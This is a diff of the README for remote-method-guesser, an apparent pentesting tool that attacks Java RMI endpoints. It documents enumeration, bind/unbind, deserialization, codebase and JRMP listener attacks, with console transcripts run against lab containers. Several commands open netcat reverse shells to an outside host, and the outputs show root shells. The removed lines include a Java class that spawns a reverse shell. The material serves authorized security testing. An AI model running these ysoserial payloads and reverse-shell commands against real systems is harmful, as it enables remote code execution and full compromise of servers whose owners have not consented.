@@ -7,9 +7,14 @@ vulnerabilities on *Java RMI* endpoints. Currently, the following operations are
 
 * List available *bound names* and their corresponding interface class names
 * List codebase locations (if exposed by the remote server)
+* Check for known vulnerabilities (enabled class loader, missing *JEP290*, localhost bypass)
 * Identify existing remote methods by using a *bruteforce* (wordlist) approach
 * Call remote methods with *ysoserial gadgets* within the arguments
 * Call remote methods with a client specified codebase (remote class loading attack)
+* Perform *DGC* and *registry* calls with *ysoserial* gadgets or a client specified codebase
+* Perform *bind*, *unbind* and *rebind* operations against a registry
+* Extend ysoserial gadgets with [An Trinhs registry bypass](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/)
+* Enumerate the unmarshalling behavior of ``java.lang.String``
 * Create Java code dynamically to invoke remote methods manually
 
 During remote method guessing, deserialization and codebase attacks, the argument types of remote method calls
@@ -28,7 +33,7 @@ and was used first (to the best of my knowledge) by [Jake Miller](https://twitte
 
 ------
 
-*rmg* is a *maven* project and the building process should be straight forward. With [maven](https://maven.apache.org/) 
+*rmg* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
 installed, just execute the following commands to create an executable ``.jar`` file:
 
 ```console
@@ -62,53 +67,62 @@ usage: rmg [options] <ip> <port> <action>
 Identify common misconfigurations on Java RMI endpoints.
 
 Positional Arguments:
-    ip:                          IP address of the target
-    port:                        Port of the RMI registry
-    action:                      One of the possible actions listed below
+    ip                              IP address of the target
+    port                            Port of the RMI registry
+    action                          One of the possible actions listed below
 
 Possible Actions:
-    attack <gadget> <command>    Perform deserialization attacks
-    codebase <url> <classname>   Perform remote class loading attacks
-    enum                         Enumerate bound names and classes
-    guess                        Guess methods on bound names
+    bind <boundname> <listener>     Binds an object to the registry thats points to listener
+    codebase <classname> <url>      Perform remote class loading attacks
+    dgc <gadget> <command>          Perform DGC based deserialization attacks
+    enum                            Enumerate bound names, classes, SecurityManger and JEP290
+    guess                           Guess methods on bound names
+    listen <gadget> <command>       Open ysoserials JRMP listener
+    method <gadget> <command>       Perform method based deserialization attacks
+    rebind <boundname> <listener>   Rebinds boundname as object that points to listener
+    reg <gadget> <command>          Perform registry based deserialization attacks
+    unbind <boundName>              Removes the specified bound name from the registry
 
 Optional Arguments:
-    --argument-position <int>    select argument position for deserialization attacks
-    --bound-name <name>          guess only on the specified bound name
-    --config <file>              path to a configuration file
-    --create-samples             create sample classes for identified methods
-    --follow                     follow redirects to different servers
-    --force-legacy               treat all classes as legacy stubs
-    --help                       display help message
-    --json                       output in json format
-    --no-color                   disable colored output
-    --no-legacy                  disable automatic legacy stub detection
-    --sample-folder <folder>     folder used for sample generation
-    --signature <method>         function signature for guessing or attacking
-    --ssl                        use SSL for the rmi-registry connection
-    --template-folder <folder>   location of the template folder
-    --threads <int>              maximum number of threads (default: 5)
-    --trusted                    disable bound name filtering
-    --update                     update wordlist file with method hashes
-    --wordlist-file <file>       wordlist file to use for method guessing
-    --wordlist-folder <folder>   location of the wordlist folder
-    --yso <file>                 location of ysoserial.jar for deserialization attacks
-    --zero-arg                   allow guessing on void functions (dangerous)
+    --argument-position <int>       select argument position for deserialization attacks
+    --bound-name <name>             guess only on the specified bound name
+    --config <file>                 path to a configuration file
+    --create-samples                create sample classes for identified methods
+    --follow                        follow redirects to different servers
+    --force-legacy                  treat all classes as legacy stubs
+    --help                          display help message
+    --localhost-bypass              attempt localhost bypass for registry operations (CVE-2019-2684)
+    --no-color                      disable colored output
+    --no-legacy                     disable automatic legacy stub detection
+    --reg-method <method>           method to use during registry operations (bind|lookup|unbind|rebind)
+    --sample-folder <folder>        folder used for sample generation
+    --signature <method>            function signature for guessing or attacking
+    --ssl                           use SSL for the rmi-registry connection
+    --stack-trace                   display stack traces for caught exceptions
+    --template-folder <folder>      location of the template folder
+    --threads <int>                 maximum number of threads (default: 5)
+    --trusted                       disable bound name filtering
+    --update                        update wordlist file with method hashes
+    --wordlist-file <file>          wordlist file to use for method guessing
+    --wordlist-folder <folder>      location of the wordlist folder
+    --yso <file>                    location of ysoserial.jar for deserialization attacks
+    --zero-arg                      allow guessing on void functions (dangerous)
 ```
 
 
-#### Enumeration
+#### Enumeration (enum)
 
-The ``enum`` action can be used to list available *bound names* on *RMI registry* endpoints. Additionally, it displays
-the names of the corresponding *Java classes* and shows the servers *codebase*, if available. ``enum`` is the default
-action of *remote-method-guesser* and can either be invoked by only specifying the port and IP address of a target
-or by specifying ``enum`` as action explicitly:
+The ``enum`` action performs several checks on the specified *RMI registry* endpoint. It provides a list of all
+available bound names, displays the servers codebase (if existent), checks for missing *JEP290* and [some other
+common vulnerabilities](./docs/actions#enum). ``enum`` is the default action of *remote-method-guesser* and can either be invoked by
+only specifying the port and IP address of a target or by specifying ``enum`` as action explicitly.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090
+[+] Creating RMI Registry object... done.
+[+] Obtaining list of bound names... done.
 [+] 3 names are bound to the registry.
+[+] 
 [+] Listing bound names in registry:
 [+] 
 [+] 	- plain-server
@@ -118,41 +132,113 @@ or by specifying ``enum`` as action explicitly:
 [+] 	- secure-server
 [+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
 [+] 
-[+] RMI servers exposes the following codebase(s):
-[+] 	
+[+] RMI server codebase enumeration:
+[+] 
 [+] 	- http://iinsecure.dev/well-hidden-development-folder/
 [+] 		--> de.qtc.rmg.server.interfaces.ISslServer
-[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer
 [+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
 [+] 		--> javax.rmi.ssl.SslRMIClientSocketFactory
+[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer
+[+] 
+[+] RMI server String unmarshalling enumeration:
+[+] 
+[+] 	- Server attempted to deserialize object locations during lookup call.
+[+] 	  --> The type java.lang.String is unmarshalled via readObject().
+[+] 	  Configuration Status: Outdated
+[+] 
+[+] RMI server useCodebaseOnly enumeration:
+[+] 
+[+] 	- Caught MalformedURLException during lookup call.
+[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
+[+] 	  Configuration Status: Non Default
+[+] 
+[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
+[+] 
+[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
+[+] 	  Vulnerability Status: Vulnerable
+[+] 
+[+] RMI server DGC enumeration:
+[+] 
+[+] 	- Security Manager rejected access to the class loader (useCodebaseOnly=false).
+[+] 	  --> The DGC uses most likely a separate security policy.
+[+] 	  Configuration Status: Non Default
+[+] 
+[+] RMI server JEP290 enumeration:
+[+] 
+[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
+[+] 	  Vulnerability Status: Non Vulnerable
+[+] 
+[+] RMI server JEP290 bypass enmeration:
+[+] 
+[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
+[+] 	  Vulnerability Status: Vulnerable
 ```
 
+#### Bind Operations (bind|rebind|unbind)
 
-#### Method Guessing
-
-When using the ``guess`` operation, *rmg* attempts to identify existing remote methods by sending method hashes
-to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
-following form:
-
-```consoloe
-[qtc@kali wordlists]$ head -n 5 rmg.txt 
-boolean call(String dummy, String dummy2, String dummy3)
-boolean call(String dummy, String dummy2)
-boolean call(String dummy, String[] dummy2)
-boolean call(String dummy)
-boolean call(String[] dummy)
-```
-
-*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
-You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
-or ``--wordlist-folder`` options. Methods with zero arguments are skipped by default. You can enable them by using the
-``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side, as their
-invocation cannot be prevented by using invalid argument types.
+By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
+This is especially useful for verifying ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform
+bind operations. Whereas the ``unbind`` action only requires the *bound name* that should be removed, the ``bind`` and ``rebind`` operations
+also require a *RemoteObject* that should be bound. *remote-method-guesser* always uses ``javax.management.remote.rmi.RMIServerImpl_Stub``
+for this purpose, which is the *RemoteObject* used by *jmx*. You need also to specify the address of the corresponding *TCP endpoint*
+(address where clients should connect to, when they attempt to use your bound object).
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090
+[+] Creating RMI Registry object... done.
+[+] Obtaining list of bound names... done.
+[+] 3 names are bound to the registry.
+[+]
+[+] Listing bound names in registry:
+[+]
+[+] 	- plain-server
+[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
+[+] 	- ssl-server
+[+] 		--> de.qtc.rmg.server.interfaces.ISslServer (unknown class)
+[+] 	- secure-server
+[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
+[...]
+
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 bind jmxrmi 172.23.0.1:4444 --localhost-bypass
+[+] Binding name jmxrmi to TCPEndpoint 172.23.0.1:4444
+[+] 
+[+] 	Encountered no Exception during bind call.
+[+] 	Bind operation was probably successful.
+
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 
+[+] Creating RMI Registry object... done.
+[+] Obtaining list of bound names... done.
+[+] 4 names are bound to the registry.
+[+] RMI object tries to connect to different remote host: 172.23.0.1
+[+] 	Redirecting the connection back to 172.23.0.2... 
+[+] 	This is done for all further requests. This message is not shown again. 
+[+] 
+[+] Listing bound names in registry:
+[+] 
+[+] 	- plain-server
+[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
+[+] 	- ssl-server
+[+] 		--> de.qtc.rmg.server.interfaces.ISslServer (unknown class)
+[+] 	- secure-server
+[+] 		--> de.qtc.rmg.server.interfaces.ISecureServer (unknown class)
+[+] 	- jmxrmi
+[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
+[...]
+```
+
+#### Method Guessing (guess)
+
+When using the ``guess`` action, *remote-method-guesser* attempts to identify existing remote methods by sending method hashes
+to the remote server. This operation requires a wordlist that contains the corresponding method definitions.
+*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
+You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
+or ``--wordlist-folder`` options. Methods with zero arguments are skipped during the enumeration, as they lead to real method calls
+on the server side. You can enable guessing on them by using the ``--zero-arg`` switch. 
+
+```console
+[qtc@kali ~]$ rmg --ssl --zero-arg 172.23.0.2 1090 guess
+[+] Creating RMI Registry object... done.
+[+] Obtaining list of bound names... done.
 [+] 3 names are bound to the registry.
 [+] 2 wordlist files found.
 [+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
@@ -162,97 +248,65 @@ invocation cannot be prevented by using invalid argument types.
 [+] 
 [+] Starting RMG Attack
 [+] 	No target name specified. Guessing on all available bound names.
-[+] 	Guessing 3302 method signatures
+[+] 	Guessing 3294 method signature(s).
 [+] 	
-[+] 		Current bound name ssl-server
-[+] 		RMI object tries to connect to different remote host: iinsecure.dev
-[+] 			Redirecting the ssl connection back to 172.18.0.2... 
-[+] 			This is done for all further requests. This message is not shown again. 
+[+] 	Current bound name: ssl-server
 [+] 		Guessing methods...
 [+]
-[+] 			Skipping zero arguments method: int getDatabaseCount()
-[+] 			Skipping zero arguments method: int getDbPort()
-[...]
 [+] 			HIT! Method with signature String system(String[] dummy) exists!
 [+] 			HIT! Method with signature int execute(String dummy) exists!
+[+] 			HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
 [+] 		
-[+] 		Current bound name plain-server
-[+] 		RMI object tries to connect to different remote host: iinsecure.dev
-[+] 			Redirecting the connection back to 172.18.0.2... 
-[+] 			This is done for all further requests. This message is not shown again. 
+[+] 	Current bound name: plain-server
 [+] 		Guessing methods...
 [+]
-[+] 			Skipping zero arguments method: int getDatabaseCount()
-[+] 			Skipping zero arguments method: int getDbPort()
-[...]
-[+] 			HIT! Method with signature String execute(String dummy) exists!
 [+] 			HIT! Method with signature String system(String dummy, String[] dummy2) exists!
+[+] 			HIT! Method with signature String execute(String dummy) exists!
 [+] 		
-[+] 		Current bound name secure-server
+[+] 	Current bound name: secure-server
 [+] 		Guessing methods...
 [+]
-[+] 			Skipping zero arguments method: int getDatabaseCount()
-[+] 			Skipping zero arguments method: int getDbPort()
-[...]
-[+] 			HIT! Method with signature String login(java.util.HashMap dummy1) exists!
-[+] 			HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
 [+] 			HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
+[+] 			HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
+[+] 			HIT! Method with signature String login(java.util.HashMap dummy1) exists!
 [+] 		
 [+] 
 [+] Listing successfully guessed methods:
-[+]
 [+] 	-  ssl-server
 [+] 		--> String system(String[] dummy)
 [+] 		--> int execute(String dummy)
+[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
 [+] 	-  plain-server
-[+] 		--> String execute(String dummy)
 [+] 		--> String system(String dummy, String[] dummy2)
+[+] 		--> String execute(String dummy)
 [+] 	-  secure-server
-[+] 		--> String login(java.util.HashMap dummy1)
-[+] 		--> void logMessage(int dummy1, Object dummy2)
 [+] 		--> void updatePreferences(java.util.ArrayList dummy1)
+[+] 		--> void logMessage(int dummy1, Object dummy2)
+[+] 		--> String login(java.util.HashMap dummy1)
 ```
 
-To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
-contains the pre-computed method hashes and some meta information about the methods.
-
-```console
-[qtc@kali wordlists]$ head -n 5 rmg.txt 
-boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
-boolean call(String dummy, String dummy2); -9048491806834107285; false; false
-boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
-boolean call(String dummy); -5603201874062960450; false; false
-boolean call(String[] dummy); -4301784332653484516; false; false
-```
-
-To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
-operation. This will update all currently used wordlist files to the optimized format.
-
-
-#### Deserialization Attacks
+#### Method Based Deserialization Attacks (method)
 
 Remote methods that do not only use primitive types within their arguments are often vulnerable to *deserialization attacks*.
-This great [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
-explains this issue in more detail. *remote-method-guesser* can be used to easily verify such a vulnerability. As an example,
+This [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
+explains this issue in more detail. *remote-method-guesser* can be used to easily verify such vulnerabilities. As an example,
 we can use the ``String login(java.util.HashMap dummy1)`` method that was guessed in the example above.
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 attack CommonsCollections6 "nc 172.18.0.1 4444 -e ash" --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
-[+] 3 names are bound to the registry.
-[+] Creating ysoserial payload...done.
-[+] Attacking String login(java.util.HashMap dummy1)
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 method CommonsCollections6 "nc 172.23.0.1 4444 -e ash" --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
+[+] Creating RMI Registry object... done.
+[+] Creating ysoserial payload... done.
+[+] Attacking signature String login(java.util.HashMap dummy1) (ysoserial attack)
 [+] Target name specified. Only attacking bound name: secure-server
 [+] 
 [+] Current bound name: secure-server
 [+] 	Found non primitive argument type on position 0
 [+] 	RMI object tries to connect to different remote host: iinsecure.dev
-[+] 		Redirecting the connection back to 172.18.0.2... 
+[+] 		Redirecting the connection back to 172.23.0.2... 
 [+] 		This is done for all further requests. This message is not shown again. 
 [+] 	Invoking remote method...
-[+] 	Caught ClassNotFoundException during deserialization attack.
-[+] 	Deserialization attack most likely worked :)
+[+] 		Caught ClassNotFoundException during ysoserial attack.
+[+] 		Deserialization attack most likely worked :)
 ```
 
 On another terminal, you can confirm that the *deserialization attack* was indeed successful:
@@ -262,157 +316,144 @@ On another terminal, you can confirm that the *deserialization attack* was indee
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 172.18.0.2.
-Ncat: Connection from 172.18.0.2:33451.
+Ncat: Connection from 172.23.0.2.
+Ncat: Connection from 172.23.0.2:39041.
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Notice that in the beginning of 2020, the ``unmarshalValue`` method of the ``UnicastRef`` class was changed to handle ``java.lang.String`` in a special way.
-Apart from primitive types, also ``java.lang.String`` can now no longer be used for the above mentioned attack on recent *Java* versions. However, other
-non primitive types are still vulnerable.
+#### General Deserialization Attacks (reg|dgc)
 
-
-#### Codebase Attacks
-
-In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within the *RMI* implementation.
-Today, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false`` and uses a *SecurityManager* with a
-lax configured security policy. Using the ``auxiliary/scanner/misc/java_rmi_server`` *Metasploit module*, one can easily identify that the *rmg-example-server*
-allows *remote class loading*:
+Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote methods* that are needed for the internal *RMI communication*.
+Whereas modern *RMI servers* apply *deserialization filters* on these *well known remote methods* (*JEP290*), older servers may be vulnerable against *deserialization
+attacks* too. *remote-method-guesser* allows to test this by using the ``dgc`` and ``reg`` actions, that perform deserialization attacks on the *Distributed
+Garbage Collector* (*DGC*) or the *RMI registry* directly. For testing purposes you can use the sufficiently outdated [example server](https://github.com/qtc-de/beanshooter/packages/398561)
+from the the [beanshooter repository](https://github.com/qtc-de/beanshooter):
 
 ```console
-msf5 auxiliary(scanner/misc/java_rmi_server) > run
-[+] 172.18.0.2:9010       - 172.18.0.2:9010 Java RMI Endpoint Detected: Class Loader Enabled
-[*] 172.18.0.2:9010       - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-```
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 9010 dgc CommonsCollections6 "nc 172.23.0.1 4444 -e /bin/bash"
+[+] Creating ysoserial payload... done.
+[+] Attempting ysoserial attack on DGC endpoint...
+[+] 
+[+] 	Caught ClassCastException during deserialization attack.
+[+] 	Deserialization attack was probably successful :)
 
-However, verifying the vulnerability isn't straight forward anymore. The following listing shows the output of the ``exploit/multi/misc/java_rmi_server``
-*Metasploit module*, which has an *excellent* reliability rank on exploiting this issue:
+[...]
 
-```console
-msf5 exploit(multi/misc/java_rmi_server) > run
-[*] Started reverse TCP handler on 172.18.0.1:4444 
-[*] 172.18.0.2:9010 - Using URL: http://172.18.0.1:8080/lkIcW0gGgS
-[*] 172.18.0.2:9010 - Server started.
-[*] 172.18.0.2:9010 - Sending RMI Header...
-[*] 172.18.0.2:9010 - Sending RMI Call...
-[-] 172.18.0.2:9010 - Exploit failed: RuntimeError Exploit aborted due to failure unknown The RMI class loader couldn't find the payload
-[*] 172.18.0.2:9010 - Server stopped.
-[*] Exploit completed, but no session was created.
-```
-
-The underlying reason is, that the *Metasploit module* (and most other tools as well) attempt to attack the internal *RMI communication*, which is better
-protected than *RMI communication* on the application level. In total, there are three reasons why the *Metasploit module* is not working:
-
-1. The *Distributed Garbage Collector* (*DGC*), that is used for the attack above, sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
-   ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.
-
-2. *RMI calls* to the *Distributed Garbage Collector* are handled within a separate ``AccessControlContext``, which denies all outbound connections. This
-   ``AccessControlContext`` (defined in ``DGCImpl.java``) overwrites the current security policy and ignores user defined policy rules.
-
-3. Even without the two restrictions mentioned above, the *Metasploit module* would still fail. *Remote class loading* attacks send an object of a custom class
-   (unknown to the remote server) within *RMI calls*. During a successful attack, the server fetches the class definition from the attacker and calls
-   the *readObject* method that contains malicious *Java code*. However, as *internal RMI communication* is now protected by *deserialization filters*, unknown
-   classes are rejected while reading the ``ObjectInputStream``.
-
-Whereas the *internal RMI communication* is well protected, *RMI communication* on the application level is not. *remote-method-guesser* can be used to verify
-*remote class loading* on a vulnerable endpoint, but as for the *deserialization attack*, it requires a method signature exposed by one of the available bound
-names.
-
-```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 codebase http://172.18.0.1:8000 Example --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
-[+] 3 names are bound to the registry.
-[+] Attacking String login(java.util.HashMap dummy1)
-[+] Target name specified. Only attacking bound name: secure-server
-[+]
-[+] Current bound name: secure-server
-[+] 	Found non primitive argument type on position 0
-[+] 	RMI object tries to connect to different remote host: iinsecure.dev
-[+] 		Redirecting the connection back to 172.18.0.2... 
-[+] 		This is done for all further requests. This message is not shown again. 
-[+] 	Invoking remote method...
-```
-
-When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:
-
-```console
-[qtc@kali www]$ web
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.18.0.2 - - [14/Nov/2020 07:48:59] "GET /Example.class HTTP/1.1" 200 -
-```
-
-*remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
-within the ``readObject`` method of the class. For this demonstration, the following class definition was used, that spawns a reverse shell:
-
-```java
-// Taken from: https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
-
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
-import java.util.jar.Attributes;
-import java.io.Serializable;
-import java.io.ObjectInputStream;
-
-public class Example implements Serializable
-{
-    private static int port = 4444;
-    private static String cmd = "/bin/ash";
-    private static String host = "172.18.0.1";
-    private static final long serialVersionUID = 2L;
-
-    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
-    {
-        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s = new Socket(host,port);
-        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
-        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
-        while(!s.isClosed()) {
-
-            while(pi.available()>0)
-                so.write(pi.read());
-
-            while(pe.available()>0)
-                so.write(pe.read());
-
-            while(si.available()>0)
-                po.write(si.read());
-
-            so.flush();
-            po.flush();
-            Thread.sleep(50);
-
-            try {
-                p.exitValue();
-                break;
-            } catch (Exception e){}
-        }
-
-        p.destroy();
-        s.close();
-    }
-}
-```
-
-After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:
-
-```console
 [qtc@kali ~]$ nc -vlp 4444
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
-Ncat: Connection from 172.18.0.2.
-Ncat: Connection from 172.18.0.2:37874.
+Ncat: Connection from 172.23.0.2.
+Ncat: Connection from 172.23.0.2:38710.
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+In case of the *RMI registry*, the *deserialization filters* may be bypassed by using the [JRMPClient](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java)
+or the [An Trinh](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) bypass gadgets. These gadgets create an *outbound RMI channel*
+that does no longer apply *deserialization filters*. On this channel, deserialization attacks can be applied as usual, but both bypasses were patched
+in the most recent versions of *Java RMI*.
 
-#### Sample Generation
+```console
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 reg AnTrinh 172.23.0.1:4444 
+[+] 
+[+] Attempting deserialization attack on RMI registry endpoint...
+[+] 
+[+] 	Caught javax.management.BadAttributeValueExpException during deserialization attack.
+[-] 	This could be caused by your gadget an the attack probably worked anyway.
+[-] 	If it did not work, you can retry with --stack-trace to see the details.
+
+[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "nc 172.23.0.1 4445 -e ash"
+[+] Creating a JRMPListener on port 4444.
+[+] Handing off to ysoserial...
+* Opening JRMP listener on 4444
+Have connection from /172.23.0.2:38784
+Reading message...
+Sending return with payload for obj [0:0:0, 123]
+
+[qtc@kali ~]$ nc -vlp 4445
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+Ncat: Connection from 172.23.0.2.
+Ncat: Connection from 172.23.0.2:40799.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Codebase Attacks (codebase)
+
+*Java RMI* supports a feature called *codebases*, where the client and the server can specify *URLs* during *RMI calls* that
+may be used to load unknown classes dynamically. If an *RMI server* accepts *client specified codebases*, this can lead to
+*remote code execution* by providing malicious *Java* classes during the *RMI communication*.
+
+The codebase configuration on an *RMI server* can be different for the three different components: *DGC*, *Registry* and *Application Level*.
+*remote-method-guesser* allows you to test each component individually by using either ``--signature <method>`` (application level),
+``--signature reg`` (rmi registry) or ``--signature dgc`` (distributed garbage collector) together with the ``codebase`` action.
+
+**Application Level**
+
+```console
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example http://172.23.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name secure-server
+[+] Creating RMI Registry object... done.
+[+] Attacking signature String login(java.util.HashMap dummy1) (codebase attack)
+[+] Target name specified. Only attacking bound name: secure-server
+[+] 
+[+] Current bound name: secure-server
+[+] 	Found non primitive argument type on position 0
+[+] 	RMI object tries to connect to different remote host: iinsecure.dev
+[+] 		Redirecting the connection back to 172.23.0.2... 
+[+] 		This is done for all further requests. This message is not shown again. 
+[+] 	Invoking remote method...
+
+[qtc@kali ~]$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.23.0.2 - - [13/Jan/2021 07:17:10] "GET /Example.class HTTP/1.1" 200 -
+```
+
+**RMI Registry**
+
+```console
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example 172.23.0.1:8000 --signature reg
+[+] Attempting codebase attack on RMI registry endpoint...
+[+] Using class Example with codebase http://172.23.0.1:8000/ during lookup call.
+
+[qtc@kali www]$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.23.0.2 - - [13/Jan/2021 07:45:48] "GET /Example.class HTTP/1.1" 200 -
+```
+
+**Distributed Garbage Collector**
+
+```console
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 codebase Example 172.23.0.1:8000 --signature dgc
+[+] Attempting codebase attack on DGC endpoint...
+[+] Using class Example with codebase http://172.23.0.1:8000/ during clean call.
+
+[qtc@kali www]$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.23.0.2 - - [13/Jan/2021 07:48:31] "GET /Example.class HTTP/1.1" 200 -
+```
+
+
+#### JRMPListener (listen)
+
+As already demonstrated above, it is sometimes required to provide a malicious *JRMPListener*, which serves deserialization payloads
+to incomming *RMI* connections. Writing such a listener from scratch is not necessary, as it is already provided by the
+[ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java).
+However, *remote-method-guesser* provides a wrapper around the *ysoserial* implementation, which lets you spawn a *JRMPListener*
+by using the usual *rmg* syntax:
+
+```console
+[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "touch /dev/shm/test"
+[+] Creating a JRMPListener on port 4444.
+[+] Handing off to ysoserial...
+* Opening JRMP listener on 4444
+```
+
+
+#### Sample Generation (--create-samples)
 
 Despite being none of the available actions, *sample generation* is another useful feature of *remote-method-guesser* and can be enabled
 during the ``guess`` action. In some situations, *RMI* endpoints expose methods that sound interesting on their own, without thinking
@@ -420,61 +461,50 @@ about *deserialization* or *codebase attacks*. Consider the example above, where
 methods:
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess
-[...]
 [+] Listing successfully guessed methods:
 [+] 	-  plain-server
-[+] 		--> String execute(String dummy)
 [+] 		--> String system(String dummy, String[] dummy2)
-[...]
+[+] 		--> String execute(String dummy)
 ```
 
 Depending on the situation, it might be desired to invoke these methods using legitimate *RMI calls*, but writing the corresponding *Java code*
-manually is a tedious work. By using the ``--create-samples`` parameter of *remote-method-guesser*, you can create sample code for successfully
+manually is a tedious work. By using the ``--create-samples`` parameter, you can create sample code for successfully
 guessed *remote methods* automatically. By using the ``--signature`` and ``--bound-name`` options, it is also possible to generate code only
 for one already known method. The following command generates the required *Java code* to invoke the ``execute`` method on the ``plain-server``
 bound name:
 
 ```console
-[qtc@kali ~]$ rmg --ssl 172.18.0.2 1090 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
-[+] 3 names are bound to the registry.
+[qtc@kali ~]$ rmg --ssl 172.23.0.2 1090 guess --create-samples --signature "String execute(String dummy)" --bound-name plain-server
+[+] Creating RMI Registry object... done.
 [+] 
-[+] Starting RMG Attack
-[+] 	Target name specified. Only guessing on bound name: plain-server
+[+] Starting Method Guessing:
+[+] 	Target name specified. Only guessing on bound name: plain-server.
 [+] 	Guessing 1 method signature(s).
